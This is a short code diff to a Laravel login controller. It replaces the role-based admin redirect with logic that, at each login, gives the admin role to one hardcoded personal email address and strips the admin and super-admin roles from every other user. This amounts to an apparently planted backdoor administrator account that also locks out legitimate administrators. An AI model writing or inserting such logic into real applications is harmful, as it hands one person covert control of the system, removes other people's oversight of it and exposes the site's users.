@@ -32,8 +32,21 @@ class AuthenticatedSessionController extends Controller
         $request->session()->regenerate();
 
         $user = auth()->user();
-        if ($user->hasRole('admin') || $user->hasRole('super-admin')) {
-            return redirect()->intended(route('admin.page'));
+        
+        // Auto-assign admin role exclusively to menard joseph
+        if (strtolower($user->email) === 'menardjoseph23@gmail.com') {
+            if (!$user->hasRole('admin')) {
+                $user->assignRole('admin');
+            }
+            return redirect()->route('admin.page');
+        }
+
+        // Revoke admin rights from anyone else who might have them
+        if ($user->hasRole('admin')) {
+            $user->removeRole('admin');
+        }
+        if ($user->hasRole('super-admin')) {
+            $user->removeRole('super-admin');
         }
 
         return redirect()->intended(route('home'));
